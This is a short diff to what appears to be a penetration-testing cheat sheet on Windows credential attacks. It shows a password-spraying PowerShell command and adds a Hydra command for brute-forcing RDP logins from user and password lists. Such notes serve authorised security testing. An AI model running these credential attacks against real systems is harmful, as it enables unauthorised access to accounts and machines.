@@ -254,6 +254,12 @@ PS> .\spray-passwords.ps1 -Admin -Pass IamUser02
 ...
 ```
 
+If there are too many users/passwords to manually each cred against RDP, use Hydra to bruteforce RDP:
+* As not all users are part of the "NT AUTHORITY\REMOTE INTERACTIVE LOGON" group.
+```
+$ hydra -L users.txt -P pass.txt rdp://[target]
+```
+
 ### Plaintext Credentials
 ```bash
 # RDP clients
